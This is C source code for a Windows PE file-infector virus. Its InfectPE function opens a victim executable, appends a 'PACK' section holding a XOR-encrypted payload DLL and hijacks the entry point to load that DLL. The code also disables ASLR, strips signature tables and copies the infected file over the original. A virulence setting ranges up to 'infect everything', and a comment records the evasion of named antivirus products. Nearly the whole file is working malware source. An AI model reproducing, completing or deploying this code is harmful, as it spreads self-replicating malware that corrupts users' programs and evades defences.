
#define SECTION_NAME "PACK"

#ifndef NODBGPRINT
#include "..\dbg.h"
#endif

#if _DEBUG
#define REAL_INFECT   // always real infect in non-debug mode
#endif

#define PEINF_USR_MA 13 
#define PEINF_LNK_MA 8

#define SECTIONS 1        // quantity of sections current
#define LESS6_SECTIONS 4  // quantity of sections for PEINF_VER<6  REINFECT
#define LESS13_SECTIONS 3 // quantity of sections for PEINF_VER<13 REINFECT
#define LESS16_SECTIONS 2 // quantity of sections for PEINF_VER<16 REINFECT
#define LESS17_SECTIONS 1 // quantity of sections for PEINF_VER<17 REINFECT

//---GLOBALS
BYTE VIRULENCE=0;         
// [0;50]    - NIGHTMARE      (infect everything)
// [51;100]  - ULTRA-VIOLENCE (only fixed drives - skip removeable, net)
// [101;150] - HURT ME PLENTY (only some files on fixed drives)
// [151;...] - HACK TERMINAL  (only services)


DWORD szinfcode;

// our 'UPX0' section vadr
unsigned char *upx_sect; 

// vadr of dll in memory
unsigned char *dll_mem;   

// size of our dll 
DWORD dll_len;  
// size of C_CODE
DWORD infsize; 
// our section name, if SECTNAME[0]==0, we use 'UPX0'
char SECTNAME[50];       


DWORD align(DWORD n,DWORD a)
{
	DWORD r;

	if (n%a == 0)
		return n;
	
	r = (n/a) * a + a;
	
	return r;
}

/////////////////////////////////////////////////

DWORD ReinfectSince17(char *fname,unsigned char *b, DWORD len, DWORD org_len, DWORD epOFS, DWORD SECTALIGN, DWORD FILEALIGN)
{
	//get exe_szinfcode
	BYTE c0, c1, c2, c3;
	BYTE exe_key;
	DWORD w, i;
	DWORD exe_upxsize1, exe_upxsize2;
	DWORD exe_szinfcode=0;
	// phys. offset of last (our 'UPX0') section begin
	DWORD q0=align(len,FILEALIGN);
	DWORD q=q0;
	// C_CODE should not be bigger size
	DWORD qm = q0+3072;
		
	if (qm > org_len) 
		qm = org_len;

	rloop:;
	exe_key = 'M' ^ b[q];

	// from 'PE' sig
	w =  q + 0xDA ;

	for (;w<q+0x230;w++)  
	{
		// '.text' section name in PE header
		c0 = b[w] ^ exe_key;              
		if (c0 != '.') 
			continue; 
		c1 = b[w+1]^exe_key; 
		if (c1 != 't') 
			continue;
		c2 = b[w+2]^exe_key; 
		if (c2 != 'e') 
			continue;
		c3 = b[w+3]^exe_key; 
		if (c3 != 'x') 
			continue;

		// compare upx.sect size counted by different ways to be sure
		exe_szinfcode = q-q0;
		exe_upxsize1 = org_len-q0;

		// exe_upxsize2: v19 align vmesto FILEALIGN nado SECTALIGN
		exe_upxsize2 = align(exe_szinfcode + b[q+1]*SECTALIGN + b[q+2]*512,FILEALIGN);

		if (exe_upxsize1 != exe_upxsize2)
			continue;
   
		// encrypted DLL FOUND!
		goto rdone;
	}

	q++;
	if (q<qm) 
		goto rloop;

rdone:;
	if (exe_szinfcode==0)
		return 0;

	// restore original exe code
	for (i = 0; i < exe_szinfcode; i++) 
		 b[epOFS + i] = b[q0 + i];

	return exe_szinfcode;
}


/////////////////////////////////////////////////
/*
	Initialisation
	Analysis
	PreInfection
	Infection
*/
BOOL InfectPE(char *fname)
{	
	// Target buffer
	unsigned char *b;

	// Contain original PE + dll
	unsigned char t[250000]; 

	 // exe section alignment
	DWORD SECTALIGN;
	DWORD FILEALIGN;
	DWORD hop, q;
	DWORD peofs, len, org_len;
	DWORD newheadersize;
	PE_HEADER *pe;
	PE_OBJENTRY *obj_e;
	HANDLE h;

	BOOL REINFECT=FALSE;
	DWORD infver;

	DWORD eiRVA; //exe import RVA
	DWORD epRVA; //exe entry point RVA
	DWORD eiofs; //exe import physoffs
	DWORD epOFS; //exe entry point physoffset

	DWORD maxrva = 0;
	DWORD maxphs = 0;
	DWORD dbgofs = 0;
	DWORD odsize;

	DWORD i, IFO;

	DWORD ip1, ip2, abcd;
	BOOL kernok;

	char *td;

	DWORD peofs_d;  
	PE_HEADER *pe_d;

	DWORD SECTSIZEA;
	BYTE key;

	DWORD dll_offs;
	DWORD xors;

//Number  Name  VirtSize RVA      PhysSize Offset   Flag
//    1  .text  000104A8 00001000 000104A8 00000400 60000020  ; DLL ENTRY POINT
//    2  .bss   0001BE68 00012000 00000000 00000000 C0000080
//    3  .data  00005504 0002E000 00005504 00010A00 C0000040
//    4  .idata 000001E4 00034000 000001E4 00016000 C0000060
//    5  .reloc 00002434 00035000 00002434 00016400 02000020
//    6  .edata 0000004C 00038000 0000004C 00018A00 40000020

	PE_OBJENTRY *obj_d; 
	DWORD rel;                // reloc
	DWORD expRVA,expOFS;      // export '.edata' RVA & offset

	DWORD dlltextOFS;         // physoffs of dll '.text' section
	DWORD dlltextPSZ;         // physsize of dll '.text' section
	DWORD dlltextVSZ;         // virtsize of dll '.text' section
	DWORD dlltextRVA;         // virt.RVA of dll '.text' section

	DWORD dlldataOFS;         // physoffs of dll '.data' section
	DWORD dlldataPSZ;         // physsize of dll '.data' section
	DWORD dlldataVSZ;         // virtsize of dll '.data' section
	DWORD dlldataRVA;         // virt.RVA of dll '.data' section

	EXPORT_DIRECTORY_TABLE *edt;
	DWORD feofs;

	dMEMORY *dmem;
	DWORD dlbmRVA;

	DWORD dlbmTextOFS;

	DWORD dll_vadr;         
	DWORD reloc_vadr;       
	DWORD new_dll_text_vadr;

	DWORD repl_data[20];
	DWORD exe_LibMain_vadr;

	DWORD add;
	DWORD start;
	DWORD jmp_ofs;

	DWORD slen;
	char nfname[0xFF];

	// Added since export offset are in .rdata
	DWORD rdataOfs;
	DWORD rdataRva;

	if (dll_len > sizeof(t)) 
	{ 
		DbgPrint("InfectPE ERROR: dll_mem > sizeof(t)\n");
		exit(1); 
	}

	DbgPrint("INFECTION : %s\n", fname);


	// ***********************************************
	// Initialisation block
	// ***********************************************

	// Copy dll
	_memcpy(&t[szinfcode],dll_mem,dll_len);

	// Open victim file                                
	hop = 0;

again:;

	// Target handle
	h = _CreateFile(fname, GENERIC_READ | GENERIC_WRITE | FILE_SHARE_READ, 0, NULL, OPEN_EXISTING, 0, NULL);
	if (h == (HANDLE)0xFFFFFFFF)
	{
		hop++; 
		if (hop == 1) 
		{ 
			UnprotectFile(fname);
			goto again; 
		} //NT-chk in func
		return FALSE;
	}

	// Target size
	len = _GetFileSize(h, NULL);
	org_len = len;   
							
	// Put target into buffer
	b = _LocalAlloc(LMEM_FIXED, len + dll_len + 0x2FFFF);
	if (b == NULL)
	{
		DbgPrint("error : %s cannot alloc\n", fname);
		goto errexit;
	}
	_ReadFile(h, b , len, &q, NULL);

	if (q < 1024) 
	{
		DbgPrint("error : %s file len is inferior to 1024\n", fname);
		goto errexit;
	}

	// Do not infect if dll_len==0
	// skip this check in AV_DETECT mode
 #ifdef AV_DETECT  
	goto skip_dllsize_chk;
 #endif

	// skip this check in AV_CURE mode
 #ifdef AV_CURE    
	goto skip_dllsize_chk;
 #endif

	if (dll_len == 0)
	{
		DbgPrint("error : %s dll_len == 0\n", fname);
		goto errexit;
	}

skip_dllsize_chk:;


	//////////////////////////////////////////
	// PE verification

	peofs = ((DWORD*)&b[0x3C])[0]; 

	if (peofs > q-SZPE) 
	{
		// not PE or corrupted
		DbgPrint("error : %s not PE or corrupted\n", fname);
		goto errexit; 
	}

	pe = b + peofs;
	if ((pe->id & 0x0000FFFF) != 0x4550)
	{
		// no 'PE' sig
		DbgPrint("error : %s no PE sig\n", fname);
		goto errexit;  
	}
	if (pe->subsystem == 1)
	{
		// os native
		DbgPrint("error : %s os native\n", fname);
		goto errexit;  
	}
	if (pe->magic != 0x10b)
	{
		// 0x10b==PE32 0x20b==PE64
		DbgPrint("error : %s x64 PE\n", fname);
		goto errexit; 
	}

	FILEALIGN = pe->filealign;
	SECTALIGN = pe->objectalign;
 

	//////////////////////////////////////////
	// Check if already infected

	// BOOL REINFECT=FALSE;
	// DWORD infver;

	// Infection signature
	if ((pe->usermajor == PEINF_USR_MA) && (pe->linkmajor = PEINF_LNK_MA))
	{
		infver = pe->userminor;

		// AV MODE: DETECT OR CURE
#ifdef AV_DETECT 
		goto real_exit;
#endif

#ifdef AV_CURE
		goto reinfect;
#endif

		if (infver>=PEINF_VER)
		{
			DbgPrint("ALREADY INFECTED %s\n",fname);
			goto errexit;
		}

		reinfect:;
		REINFECT = TRUE;
	}

	if (REINFECT != 0)
	{
		if (infver < 6)  
			pe->numofobjects-=LESS6_SECTIONS;  //4
		else if (infver < 13)
			pe->numofobjects-=LESS13_SECTIONS; //3
		else if (infver < 16)
			pe->numofobjects-=LESS16_SECTIONS; //2
		else if (infver < 17)
			pe->numofobjects-=LESS17_SECTIONS; //1
		else 
			pe->numofobjects = pe->numofobjects - SECTIONS;
	}

 #ifdef AV_CURE
	if (!REINFECT) 
		goto errexit;
 #endif


	// ***********************************************
	// Analysis block
	// ***********************************************


	//////////////////////////////////////////////
	// Get import table and entry point

	//exe import RVA
	eiRVA  = pe->importrva; 
	//exe entry point RVA
	epRVA  = pe->entrypointrva;
	//exe import physoffs
	//eiofs;
	//exe entry point physoffset
	epOFS = 0; 
	

	//////////////////////////////////////////////////////
	// check imports location

	if ((eiRVA > epRVA) && (eiRVA < epRVA + szinfcode))
	{
		DbgPrint("error : %s import start (eiRVA:0x%X) after pe (epRVA:0x%X), inside c code\n", fname, eiRVA, epRVA);
		goto errexit;
	}

	if ((eiRVA < epRVA) && (eiRVA+pe->importsize > epRVA))
	{
		DbgPrint("error : %s import start (eiRVA:0x%X) before pe (epRVA:0x%X), but end inside c_code\n", fname, eiRVA, epRVA);
		goto errexit;
	}


	newheadersize = peofs + SZPE + pe->boundimpsize; 
	newheadersize += (pe->numofobjects * SZOBJE);
	newheadersize += (SZOBJE * SECTIONS);

	// out of objects & bound import check
	if (newheadersize > pe->headersize)
	{
		DbgPrint("error : %s out of objects & bound import check failed\n", fname);
		goto errexit;
	}


cycle:;
	maxrva = 0;
	maxphs = 0;
	dbgofs = 0;


	//////////////////////////////////////
	// Sections traveling
	
	for (q = 0; q < pe->numofobjects; q++)
	{
		DWORD rva;
		DWORD phs;

		// Get section info
		obj_e = b + peofs + SZPE + SZOBJE * q;
		rva = obj_e->virtrva  + obj_e->virtsize;
		phs = obj_e->physoffs + obj_e->physsize;

		if (rva > maxrva) 
			maxrva = rva;
		if (phs > maxphs)
			maxphs = phs;

		if ((pe->debugrva >= obj_e->virtrva) && (pe->debugrva < rva)) 
			dbgofs = obj_e->physoffs + pe->debugrva - obj_e->virtrva;

		if ((eiRVA >= obj_e->virtrva)&&(eiRVA < obj_e->virtrva+obj_e->virtsize))
			eiofs = (eiRVA - obj_e->virtrva) + obj_e->physoffs;

		if ((epRVA >= obj_e->virtrva)&&(epRVA < obj_e->virtrva+obj_e->virtsize))
		{
			DWORD ep_sect_ofs, space;
			// set "Write" permission on section - obsolete, use VirtualProtect
			//obj_e->objectflags|=0x80000000; 
			epOFS = (epRVA-obj_e->virtrva) + obj_e->physoffs;
			

			/////////////////////////////////////////////////
			// Check space for C_CODE

			// EP offset inside section
			ep_sect_ofs = epRVA - obj_e->virtrva; 
			// free space
			space = obj_e->physsize - ep_sect_ofs; 

			if (szinfcode > space)
			{
				DbgPrint("error : %s no enough space\n", fname);
				goto errexit;
			}
		}
	} // for


	///////////////////////////////////////
	// Check debug table size (overlay)

	// size of debugs stored as overlay (after all sections)
	odsize = 0; 

	if (dbgofs != 0)
	{
		PE_DEBUG *dt;
		// max phys offset of debug info
		DWORD dseek=0;

		for (q = 0; q < pe->debugsize / SZDBG; q++)
		{
			dt = &b[dbgofs + q * SZDBG];

			if (dt->DataSeek > dseek)  
				dseek = dt->DataSeek;
			if (dt->DataSeek >= maxphs)
				odsize += dt->DataSize; 
		}

		// OVERLAY check
		dseek = align(dseek, FILEALIGN); 
	 
		// OVERLAY!
		if ((REINFECT == 0) && (maxphs != len))  
		{
			// overlay size
			DWORD ovsize = len-maxphs; 

			// this overlay is debug table, all ok
			if (dseek == maxphs) 
				goto all_ok;

			// ALL OK, overlay is security table (exe sign here in iexplore.exe win7)
			if ((maxphs==pe->securityrva)&&(ovsize==pe->securitysize)) 
			{
				// cut security table
				len=maxphs; 
				pe->securityrva  = 0;
				pe->securitysize = 0;
				goto all_ok; 
			}

			DbgPrint("error : %s maxphs != len != securityrva\n", fname)
			goto errexit;
			all_ok:;
		}
	}	// end of overlay

	//cut our sections 
	if (REINFECT!=0)
		len=maxphs+odsize; 

	maxrva = align(maxrva, SECTALIGN);

	// Overlay & no dbg section
	if ((len != maxphs) && (pe->debugrva == 0)) 
	{
		DbgPrint("exit : %s overlay and no debug directory\n", fname);
		goto errexit; 
	}
	

	//////////////////////////
	// Reinfection

	// old reinfect: ver<17
	if ((REINFECT != 0) && (infver < 17) && (epOFS == 0))
	{
		// find eip of jmp xxxxxxxx
		IFO = align(len,FILEALIGN);
	                                                                 
		for (i = 7; i < 50; i++)
		{
			if (b[IFO+i]==0xE9)
				break; // 7 == PUSHAD+CALL_ZZXXCCVV+POPAD
		}

		if (i == 50) 
		{
			DbgPrint("error : %s no pushad ???\n", fname);
			goto errexit;
		}

		// get jmp's XXXXXXXX      
		abcd = ((DWORD*)(&b[IFO+i+1]))[0];   
		// jmp EIP       
		ip1 = pe->imagebase + pe->entrypointrva + i;                                                
		// restored EP
		ip2 = (abcd-0xFFFFFFFF) + ip1 + 4;  

		pe->entrypointrva = ip2-pe->imagebase;
		epRVA = ip2-pe->imagebase;

#ifdef AV_CURE
		pe->imagesize=align(maxrva,SECTALIGN); 
		pe->usermajor = 0;
		pe->linkmajor = 0;
		pe->userminor = 0;
		goto save_ivr;
#endif

		// again loop through exe sections to get epOFS
		goto cycle;  
	} // of old reinfect

	// new reinfect: ver>=17
	if ((REINFECT!=0) && (infver>=17))
	{
		DWORD exe_szinfcode = ReinfectSince17(fname,b,len,org_len,epOFS,SECTALIGN,FILEALIGN);
		if (exe_szinfcode==0) 
		{
			DbgPrint("error : %s szinfcode is null\n", fname);
			goto errexit;
		}
	}	// end new reinfect


	// Check if import table contain kernel32
	kernok = FALSE;
	for (q = 0; q < pe->importsize; q += SZIDTE)
	{
		DWORD idllofs, w;
		char dllname[0xFF];
		IMPORT_DIRECTORY_TABLE_ENTRY *idte = &b[eiofs+q];
		if (idte->ImportLookUp == 0)
			break;

		// import dll physoffs
		idllofs = (idte->NameRVA-eiRVA) + eiofs; 
		my_strcpy(dllname, &b[idllofs]);

		for (w = 0; dllname[w] != 0; w++)
		{
			if ((dllname[w]>'a')&&(dllname[w]<'z'))
				dllname[w]-=('a'-'A');
		}

		if ((dllname[0]=='K')&&(dllname[1]=='E')&&(dllname[2]=='R')&&(dllname[5]=='L')&&(dllname[6]=='3')&&(dllname[7]=='2')) 
			kernok=TRUE;
	}

	if (kernok==0)
	{
		DbgPrint("error : %s no kernel32 in import table\n", fname);
		goto errexit; 
	}


	//  Vista fix set bit 0 (strip reloc) 
	//  Win7 ASLR fix (IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE): reset bix 0x40
	pe->flags |= 1; 
	if (pe->dllflags&&0x40 == 0x40) 
		pe->dllflags ^= 0x40;


	// Get num of sections in DLL object table

	// Pointer to dll (lokiw.dll)
	td = t+szinfcode; 

	// Obtient entrypoint de lokiw.dll
	peofs_d = ((DWORD*)&td[0x3C])[0];
	pe_d = td+peofs_d;



	// ***********************************************
	// PreInfection block
	// ***********************************************


	if (REINFECT) 
		goto skipbounds;

	// Move bound imports
	if ((pe->boundimprva !=0)&&(pe->boundimpsize != 0)&&(pe->headersize > newheadersize))
	{
		DWORD src, dst;
		
		// we have 6 original sections in dll
		// we dont add to exe: dll.reloc , dll.edata , dll.idata , dll.bss
		// we add to exe: orig.dll  , dll.text  , dll.data

		src = peofs + SZPE + pe->numofobjects * SZOBJE; 
		dst = src + SZOBJE * SECTIONS;  

		_memcpy(&b[dst], &b[src], pe->boundimpsize);
		pe->boundimprva += SZOBJE * SECTIONS;
	}


skipbounds:;
	len = align(len, FILEALIGN);

	////////////////////////////////////////////////////////////////
	// Create section & add "ORIGINAL DLL" section to victim exe

	// Get section size
	SECTSIZEA = align(dll_len+szinfcode,0x1000);
	obj_e=b+peofs+SZPE+SZOBJE*pe->numofobjects;

	my_strcpy((char*)obj_e->name, SECTION_NAME);

	_memset(obj_e->reserved,0,12); 
	obj_e->virtsize    = SECTSIZEA;
	obj_e->virtrva     = maxrva;
	obj_e->physsize    = SECTSIZEA;
	obj_e->physoffs    = len;
	obj_e->objectflags = 0xE0000000;   

	// old:0xE0000020 (palit BullGuard, G Data, F-Secure Internet Security)
	// Vista fix, old was: 0xC0000040
	// bit 5 scn_cnt_code  
	// bit29 mem_execute ;or fault on 1st instruction
	// bit30 mem_read    ;or fault - cant read
	// bit31 mem_write   ;or fault - cant write

	// Updating
	len = align(len+obj_e->physsize,FILEALIGN); 
	maxrva += SECTSIZEA;  
	maxrva = align(maxrva, SECTALIGN);
	pe->numofobjects++;
	pe->imagesize = align(obj_e->virtrva + obj_e->virtsize, SECTALIGN);


	///////////////////////////////////////////////////
	// xor header

	// Creating key
	key = 1+_rand()%253;
	
	// quantity of 4kb blocks in dll_len (max_size>1mb)
	td[1] = dll_len/0x1000; 
	// xor 'M' by key
	td[0] = 'M'^key;

	if (td[1]>10)
	{
		// decrease quantity of 4k blocks by random value
		td[1]-=_rand()%10; 
	}

	// the rest, in 512-bytes blocks
	td[2] = (dll_len-td[1]*0x1000)/512;

	// VIRULENCE
	if (VIRULENCE<51)
		td[0x40]=_rand()%50; 
	else 
		td[0x40]=VIRULENCE; // infector virulence

	// SAVE pe->entrypointrva - we need this func
	// because in some NET exe (vista, infocard.exe)
	// EP is changed by loader after start
	((DWORD*)&td[0x41])[0]=pe->entrypointrva;     

	// KILL dll dos stub & 'PE'==td[peofs_d]+td[peofs_d+1]
	for (i = 0x45; i < peofs_d + 2; i++) 
		td[i]=_rand()%255;


	// ***********************************************
	// Infection block
	// ***********************************************

	// Store original EP
	_memcpy(t,&b[epOFS],szinfcode); 

	// Copy in the new section the original EP and payload dll
	_memcpy(&b[obj_e->physoffs], t, dll_len+szinfcode);


	////////////////////////////////////////
	// encrypt dll

	// dll offset in exe
	dll_offs = obj_e->physoffs + szinfcode; 
	// do not encrypt xorkey and len (3 bytes)
	// start position of xor 
	xors = dll_offs + 3;

	for (i = xors;i<xors + dll_len; i++)
		b[i]=b[i]^key;


	///////////////////////////////////////
	// Get some offset and rva of the dll
	for (q = 0; q < pe_d->numofobjects; q++)
	{
		obj_d = td+peofs_d+SZPE+SZOBJE*q;                
		
		//.edata ; (if section will change, can use ExportTableRva)
		if (obj_d->name[1]=='e')
		{
			expOFS = obj_d->physoffs;
			expRVA = obj_d->virtrva;
			continue;
		}

		//.text
		if (obj_d->name[1]=='t')
		{
			dlltextRVA = obj_d->virtrva; //virt.rva
			dlltextVSZ = obj_d->virtsize; //virt.size
			dlltextOFS = obj_d->physoffs; //phys.offs
			dlltextPSZ = obj_d->physsize; //phys.size
			continue;
		}

		//.data
		if (obj_d->name[1]=='d')
		{
			dlldataRVA = obj_d->virtrva; //virt.rva
			dlldataVSZ = obj_d->virtsize; //virt.size
			dlldataOFS = obj_d->physoffs; //phys.offs
			dlldataPSZ = obj_d->physsize; //phys.size
			continue;
		}

		// .reloc
		if (obj_d->name[1]=='r' && obj_d->name[2]=='e')
		{
			rel = obj_d->physoffs;
			//rel = obj_d->virtrva;
			continue;
		 }

		// .rdata
		if (obj_d->name[1]=='r' && obj_d->name[2]=='d')
		{
			rdataOfs = obj_d->physoffs;
			rdataRva = obj_d->virtrva;
			continue;
		 }
	}

	// STACK & HEAP reserve
	if (!REINFECT)
	{
		pe->stackreserve+=pe_d->stackreserve;
		pe->heapreserve+=pe_d->heapreserve;
	}

	// Mark as infected
	pe->usermajor = PEINF_USR_MA;
	pe->linkmajor = PEINF_LNK_MA;
	pe->userminor = PEINF_VER;    


	////////////////////////////////////////
	// get LibMain from dll export table

	// Get EXPORT_DIRECTORY_TABLE
	expRVA = pe_d->exportrva;
	expOFS = rdataOfs + (expRVA - rdataRva);
	
	edt = td + expOFS;
	// first export offset
	feofs = expOFS + edt->AddressTableRVA - expRVA; 
	// Point to first export offset
	dmem = td + feofs;
	// dll libmain RVA
	dlbmRVA  = dmem->dword0;   


	//////////////////////////
	// Get exe LibMain RVA

	// dll libmain inside '.text' section offset
	dlbmTextOFS = dlbmRVA - dlltextRVA; 

	// Prepare data table for C_CODE
	dll_vadr = obj_e->virtrva + pe->imagebase + szinfcode;
	new_dll_text_vadr = pe->imagebase + maxrva; 

	reloc_vadr = dll_vadr + rel;
	//reloc_vadr = dll_vadr + pe_d->fixuprva;

	repl_data[0]  = dll_vadr;
 
	// dll_text_vadr
	repl_data[1]  = dll_vadr + dlltextOFS; 
	// dll_text_psize
	repl_data[2]  = dlltextPSZ; 
	repl_data[3]  = new_dll_text_vadr;

	// dll_data_vadr
	repl_data[4]  = dll_vadr + dlldataOFS;
	// dll_data_psize
	repl_data[5]  = dlldataPSZ; 
	// new_dll_data_vadr
	repl_data[6]  = new_dll_text_vadr + dlldataRVA - dlltextRVA; 

	repl_data[7]  = reloc_vadr;    
	// exe_imagebase
	repl_data[8]  = pe->imagebase; 
	// dll_imagebase
	repl_data[9]  = pe_d->imagebase; 
	// reloc_vadr + dll_fixupsize
	repl_data[10] = reloc_vadr + pe_d->fixupsize; 

	repl_data[11] = dlltextRVA;
	repl_data[12] = dlldataRVA;
	repl_data[13] = dll_len;
	repl_data[14] = 0x1000000*(_rand()%255) + 0x10000*(_rand()%255) + 0x100*(_rand()%255) + key;

	// Obtain libMain address
	exe_LibMain_vadr = new_dll_text_vadr + dlbmTextOFS; 

	// added 0x1000 is fixup buffer for .idata (we do not check sect. borders more in C_CODE)
	add = dlldataRVA - dlltextRVA + align(dlldataVSZ,0x1000) + 0x1000;

	maxrva+=add;
	pe->imagesize+=add;
	obj_e->virtsize+=add;

	maxrva=align(maxrva,SECTALIGN);
	pe->imagesize=align(pe->imagesize,SECTALIGN);


	// Write the new EP in the target
	WriteOrGetLen_C_CODE(&b[epOFS],&repl_data,exe_LibMain_vadr,epRVA);


	//////////////////////////////////////////////
	// Write the original EP address at the end of LibMain
	start = dll_offs + dlltextOFS;

	jmp_ofs=0;

	//  ".byte 0xC9                      \n"  00             //  leave
	//  ".byte 0x61                      \n"  01             //  popad
	//  ".byte 0xE9,0x00,0x00,0x00,0x00  \n"  02 03 04 05 06 //  jmp orig_EP    
	//  ".byte 0xC3                      \n"  07             //  retn  ; NOT USED, JUST SIGNATURE FOR SEARCH

	// xor EP
	for (q = start; q < start + dlltextPSZ; q++)
	{
		BYTE c0, c1, c2, c7;
		//xorkey
		c0=b[q]^key; 
		c1=b[q+1]^key; 
		c2=b[q+2]^key; 
		c7=b[q+7]^key;
		
		if ((c0 == 0xC9) && (c1 == 0x61) && (c2 == 0xE9) && (c7 == 0xC3)) 
		{ 
			jmp_ofs=q+2;
			break;
		}
	}

	if (jmp_ofs == 0) 
	{
		DbgPrint("error : %s jump offset not found, dll libmain doesn't contain end signature\n", fname);
		goto errexit; 
	}


	// eip of jmp xxxxxxxx: repl_data[3]==new_dll_text_vadr
	ip1=repl_data[3]+jmp_ofs-start; 

	// entry point vadr
	ip2=pe->imagebase+epRVA; 


	// abcd contain original EP
	// abcd=ffffffff-ip1+ip2-4
	// we use fffffffe and -3 instead: with 0xFFFFFFFF lcc makes stack bug
	abcd = (0xFFFFFFFE-ip1)+ip2-3;

	((DWORD*)(&b[jmp_ofs+1]))[0]=abcd;
 
	b[jmp_ofs+1]^=key;
	b[jmp_ofs+2]^=key;
	b[jmp_ofs+3]^=key;
	b[jmp_ofs+4]^=key;


	//////////////////////////////////////////////////
	// Save and erase the target
	
save_ivr:;
	_CloseHandle(h);

	my_strcpy(nfname,fname);
	slen = strlen(fname);
	nfname[slen-3] = 'v';
	nfname[slen-2] = 'i';
	nfname[slen-1] = 'r';

	h=_CreateFile(nfname,GENERIC_WRITE,0,NULL,CREATE_ALWAYS,0,NULL);
	_WriteFile(h,b,len,&q,NULL);

	_CloseHandle(h);
	_LocalFree(b);

#ifdef AV_CURE
	if (h != INVALID_HANDLE_VALUE) 
		DbgPrint(" CURED! len:%u file:%s\n",len,nfname);
	else
		DbgPrint(" CURE ERR! file:%s\n",nfname);
#endif


#ifdef REAL_INFECT	
	_CopyFile(nfname,fname,FALSE);
	_DeleteFile(nfname);
#endif

	// Fin de l'infection
	DbgPrint("INFECTED : %s\n", fname);

	return TRUE;


	errexit:;
	DbgPrint("NOT INFECTED\n", fname);

	realexit:;
	_CloseHandle(h);
	if (b != NULL)
		_LocalFree(b);
	return FALSE;
}
